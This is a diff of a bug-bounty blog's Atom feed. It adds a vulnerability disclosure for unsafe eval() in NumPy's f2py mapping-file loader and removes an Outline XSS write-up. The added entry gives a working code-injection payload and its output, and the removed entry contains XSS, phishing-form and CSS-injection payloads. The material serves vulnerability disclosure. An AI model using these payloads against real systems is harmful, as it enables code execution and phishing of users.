@@ -1,4 +1,117 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-01T17:45:03+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Git remote origin leaks user access token</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2024-07-04T11:35:50+08:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">sunriseXu’s bug hunting journey</title><subtitle>sunriseXu&apos;s bug hunting journey, sharing new findings of bug hunting.</subtitle><entry><title type="html">Unsafe eval via f2py in Numpy</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html" rel="alternate" type="text/html" title="Unsafe eval via f2py in Numpy" /><published>2024-07-03T10:31:06+08:00</published><updated>2024-07-03T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/03/eval-in-numpy.html"><![CDATA[<h2 id="name">Name</h2>
+
+<blockquote>
+  <p>Unsafe eval via f2py in Numpy</p>
+</blockquote>
+
+<h2 id="weakness">Weakness</h2>
+
+<blockquote>
+  <p>CWE-94: Code Injection</p>
+</blockquote>
+
+<h2 id="severity">Severity</h2>
+
+<blockquote>
+  <p>High (8.8)</p>
+</blockquote>
+
+<h2 id="version">Version</h2>
+
+<blockquote>
+  <p>2.0.0</p>
+</blockquote>
+
+<h2 id="description">Description</h2>
+
+<p><a href="https://numpy.org/doc/stable/f2py/index.html#f2py-user-guide-and-reference-manual">F2PY</a> distributed as part of NumPy which is used to convert fortan module to python module. It will convert fortan module to C <code class="language-plaintext highlighter-rouge">.so</code> module for python to import. During conversion, F2PY needs to know what would be the corresponding C type and a general solution for that would be too complicated to implement. A json file containing fortan type to C type mapping can be passed to F2PY by using the <a href="https://numpy.org/doc/stable/f2py/advanced/use_cases.html#dealing-with-kind-specifiers">–f2cmap option</a> during conversion:</p>
+
+<p>The mapping file format:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Fortran typespec&gt; : {&lt;selector_expr&gt;:&lt;C type&gt;}
+</code></pre></div></div>
+
+<p>A mapping file example:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>{'real': {'KIND(0.0D0)': 'double'}}
+</code></pre></div></div>
+
+<p>However, during loading of f2cmap file, <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L138C5-L138C21">load_f2cmap_file</a> is called and <code class="language-plaintext highlighter-rouge">eval()</code> is used to parse the json content in the mapping file. If a victim loads a malicious mapping file, command injection can be achieved.</p>
+
+<p>The vulnerable sink: <a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def load_f2cmap_file(f2cmap_file):
+    global f2cmap_all, f2cmap_mapped
+
+    f2cmap_all = copy.deepcopy(f2cmap_default)
+
+    if f2cmap_file is None:
+        # Default value
+        f2cmap_file = '.f2py_f2cmap'
+        if not os.path.isfile(f2cmap_file):
+            return
+
+    try:
+        outmess('Reading f2cmap from {!r} ...\n'.format(f2cmap_file))
+        with open(f2cmap_file) as f:
+            # vulnerable to command injection
+            d = eval(f.read().lower(), {}, {})
+        f2cmap_all, f2cmap_mapped = process_f2cmap_dict(f2cmap_all, d, c2py_map, True)
+        outmess('Successfully applied user defined f2cmap changes\n')
+    except Exception as msg:
+        errmess('Failed to apply user defined f2cmap changes: %s. Skipping.\n' % (msg))
+</code></pre></div></div>
+
+<h2 id="proof-of-concept">Proof of Concept</h2>
+
+<p>Firstly, let’s create a malicous mapping file named <code class="language-plaintext highlighter-rouge">mapfile.txt</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>__import__('os').system('id')
+</code></pre></div></div>
+
+<p>Then, install numpy:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip install --upgrade numpy
+</code></pre></div></div>
+
+<h3 id="start-attack">Start attack</h3>
+
+<p>Load <code class="language-plaintext highlighter-rouge">mapfile.txt</code> using <code class="language-plaintext highlighter-rouge">F2PY</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>f2py -c test.f --f2cmap mapfile.txt
+</code></pre></div></div>
+
+<p>Now let’s check the output, the command <code class="language-plaintext highlighter-rouge">id</code> is executed successfully:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>running build
+running config_cc
+INFO: unifing config_cc, config, build_clib, build_ext, build commands --compiler options
+running config_fc
+INFO: unifing config_fc, config, build_clib, build_ext, build commands --fcompiler options
+running build_src
+INFO: build_src
+INFO: building extension "untitled" sources
+INFO: f2py options: ['--f2cmap', 'mapfile.txt']
+INFO: f2py:&gt; /tmp/tmpgkxylea2/src.linux-x86_64-3.10/untitledmodule.c
+creating /tmp/tmpgkxylea2/src.linux-x86_64-3.10
+OSError: [Errno 2] No such file or directory: 'test.f'. Skipping file "test.f".
+Reading f2cmap from 'mapfile.txt' ...
+uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),116(netdev),1001(docker)
+</code></pre></div></div>
+
+<h2 id="colab">Colab</h2>
+
+<p>Tested on google colab: <a href="https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing">https://colab.research.google.com/drive/1Cx6nYcAK0251NgGWi4JsTeCalg5VDMat?usp=sharing</a></p>
+
+<p><img src="https://live.staticflickr.com/65535/53834219079_360ff6894d_h.jpg" alt="poc" /></p>
+
+<h2 id="impact">Impact</h2>
+
+<p>This vulnerability can have severe consequences. If victims load an malicious mapping file, command injection can be achieved.</p>
+
+<h2 id="occurrences">Occurrences</h2>
+
+<p><a href="https://github.com/numpy/numpy/blob/c21ac104e544e24c88dbf625b6dccdbe7b90e39e/numpy/f2py/capi_maps.py#L157">load_f2cmap_file#L157</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Git remote origin leaks user access token</title><link href="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html" rel="alternate" type="text/html" title="Git remote origin leaks user access token" /><published>2024-07-01T10:31:06+08:00</published><updated>2024-07-01T10:31:06+08:00</updated><id>http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token</id><content type="html" xml:base="http://0.0.0.0:4000/file-overwrite/2024/07/01/git-origin-leak-access-token.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Git remote origin leaks user access token</p>
@@ -68,7 +181,7 @@ git remote get-url origin
 
 <h2 id="impact">Impact</h2>
 
-<p>This can have severe consequences. <strong>Any</strong> tools running in private repositories have ability to steal personal access token if the token is written in git remote url explicitly. Git should mask user’s access token when using cli command <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>
+<p>This can have severe consequences. <strong>Any</strong> tools running in private repositories have ability to steal personal access token if the token is written in git remote url explicitly. Git should mask user’s access token when using cli command <code class="language-plaintext highlighter-rouge">git remote get-url origin</code>.</p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in nltk.data.load in NLTK(Informative)" /><published>2024-06-28T10:31:06+08:00</published><updated>2024-06-28T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/28/command-injection-in-nltk.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads in nltk.data.load</p>
@@ -478,7 +591,7 @@ await role.run(Message(content="Invoicing date", instruct_content=InvoicePath(fi
 
 <p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/actions/invoice_ocr.py#L79">_unzip#L79</a></p>
 
-<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/geekan/MetaGPT/blob/9f8f0a27fd3e7d6a7f6fcf40103a94829533bdc2/metagpt/utils/file.py#L39">write#L39</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in dask.array.from_npy_stack in NLTK(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-dask.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads in dask.array.from_npy_stack</p>
@@ -596,7 +709,7 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <h2 id="occurrences">Occurrences</h2>
 
-<p><a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708">dask.array.from_npy_stack#L5708</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in LdaModel.load in gensim</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in LdaModel.load in gensim" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/dask/dask/blob/ff2488aec44d641696e0b7aa41ed9e995c710705/dask/array/core.py#L5708">dask.array.from_npy_stack#L5708</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-gensim.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads in LdaModel.load</p>
@@ -712,7 +825,7 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692">LdaModel.load#L1692</a></p>
 
-<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460">utils.unpickle#L1460</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html"><![CDATA[<h2 id="name">Name</h2>
+<p><a href="https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460">utils.unpickle#L1460</a></p>]]></content><author><name></name></author><category term="command-injection" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)</title><link href="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html" rel="alternate" type="text/html" title="Command injection via unsafe pickle.loads in hummingbird.ml.load in hummingbird(Informative)" /><published>2024-06-24T10:31:06+08:00</published><updated>2024-06-24T10:31:06+08:00</updated><id>http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird</id><content type="html" xml:base="http://0.0.0.0:4000/command-injection/2024/06/24/command-injection-in-hummingbird.html"><![CDATA[<h2 id="name">Name</h2>
 
 <blockquote>
   <p>Command injection via unsafe pickle.loads using api hummingbird.ml.load</p>
@@ -993,63 +1106,4 @@ prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
 
 <p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/electron/main.js#L305</a></p>
 
-<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry><entry><title type="html">XSS in Outline when rendering mermaid diagrams(No Security Impact!)</title><link href="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html" rel="alternate" type="text/html" title="XSS in Outline when rendering mermaid diagrams(No Security Impact!)" /><published>2024-06-02T10:31:06+08:00</published><updated>2024-06-02T10:31:06+08:00</updated><id>http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram</id><content type="html" xml:base="http://0.0.0.0:4000/xss/2024/06/02/xss-in-outline-render-mermaid-diagram.html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.</p>
-
-<h3 id="details">Details</h3>
-<p>Outline is using <a href="https://github.com/outline/outline/blob/cb0f03d69820d9cd3422252cb511c7dfeed61904/package.json#L151">mermaid 9.3.0</a> to render mermaid diagram. However, <a href="https://github.com/Milkdown/milkdown/issues/1267#issuecomment-2018032986">this issue</a> have discussed the XSS in mermaid below 10.9.0 when rendering the node names of classDiagram. The name of node is not fully sanitized which leads to  injection of XSS payload.</p>
-
-<h3 id="poc">PoC</h3>
-
-<ol>
-  <li>Use <code class="language-plaintext highlighter-rouge">/Mermaid Diagram</code> to insert following xss payload:</li>
-</ol>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  classDiagram
-  Class01 &lt;|-- `AveryLongClass&lt;img src='x' onerror=alert(document.domain)&gt;`
-  Class03 *-- Class04
-  Class05 o-- Class06
-  Class07 .. Class08
-  Class01 : size()
-  Class01 : int chimp
-  Class01 : int gorilla
-</code></pre></div></div>
-<ol>
-  <li>
-    <p>Open chrome devtools, you can see CSP is blocking the XSS from executing.</p>
-
-    <p><img width="762" alt="outline-xss" src="https://github.com/outline/outline/assets/33363160/360801a9-0964-46f2-9244-5b2d4466da72" />
- <img width="647" alt="outline-xss2" src="https://github.com/outline/outline/assets/33363160/519f4340-187a-401f-a2be-356b8d6e1513" /></p>
-  </li>
-  <li>
-    <p>Use following paylod to inject forms for phishing:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
- Class01 &lt;|-- `&lt;form action='https://google.com'&gt;&lt;label for='fname'&gt;First name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='fname' name='fname' value='John'&gt;&lt;br&gt;&lt;label for='lname'&gt;Last name:&lt;/label&gt;&lt;br&gt;&lt;input type='text' id='lname' name='lname' value='Doe'&gt;&lt;br&gt;&lt;br&gt;&lt;input type='submit' value='Submit'&gt;&lt;/form&gt;`
-</code></pre></div>    </div>
-
-    <p><img width="672" alt="xss-phishing" src="https://github.com/outline/outline/assets/33363160/4e495246-59bf-44b3-a41d-eb9459cb2a69" /></p>
-  </li>
-  <li>
-    <p>Use following to inject css styles:</p>
-
-    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> classDiagram
- Class01 &lt;|-- `&lt;h1&gt;inject styles&lt;/h1&gt;&lt;style&gt;div{color:red!important;font-size:22px;}&lt;/style&gt;`
- Class01 : int gorilla
-</code></pre></div>    </div>
-    <p><img width="648" alt="css-injection" src="https://github.com/outline/outline/assets/33363160/928803ff-e90b-4d64-8180-0a50e688fc87" /></p>
-  </li>
-  <li>
-    <p>The poc can be found in <a href="https://sunflowers101.getoutline.com/s/1784c475-adf0-427e-9231-377b6bec6140">this page</a>.</p>
-  </li>
-</ol>
-
-<h3 id="impact">Impact</h3>
-
-<p>In official outline page, the XSS is blocked by CSP, but attacker can still inject html payload to phishing, or using css injection to get csrf token. Besides, if self-host outline is not configured with CSP, the XSS will be triggered.</p>
-
-<h3 id="reference">Reference</h3>
-
-<p><a href="https://github.com/Milkdown/milkdown/issues/1267">https://github.com/Milkdown/milkdown/issues/1267</a></p>
-
-<p><a href="https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D">https://milkdown.dev/playground?text=AYi2FMCdQQwSwCYCgDGAbGBnTAROMBzSGUJAYQ2wAYBGAAgB4AfAWhbuAEEA3KATwAyAewB2BClkwM4oAnUyQUAXgDkADxV1RUSEMhKYaKABcAFAiEoArhBHGAdCiFCA1nHABKAHzBylTFQAzHQAVGx0EtQALH6SVACsWuGRAQBssdQA7HT29hH%2BVAAcGQH0AFzycABe4KYeJbR0FXB2dCgAFjIADg3ldC3GdAR6cGgYSCC%2BSEA%3D</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid plugin is used to render diagrams, a known XSS in mermaid classDiagram is able to trigger in outline mermaid diagram.]]></summary></entry></feed>
+<p><a href="https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30">https://github.com/siyuan-note/siyuan/blob/cfec6bc600894e2b99a3f07310a2a4b65390e335/app/changelogs/v3.0.0/v3.0.0.md?plain=1#L30</a></p>]]></content><author><name></name></author><category term="xss" /><summary type="html"><![CDATA[Summary Due to outdated mermaid 10.8.0 is used to render block diagrams, a XSS in block diagram is able to trigger, chained with insecure configuration of windows electron app, attacker is able to execute code in victims local system.]]></summary></entry></feed>
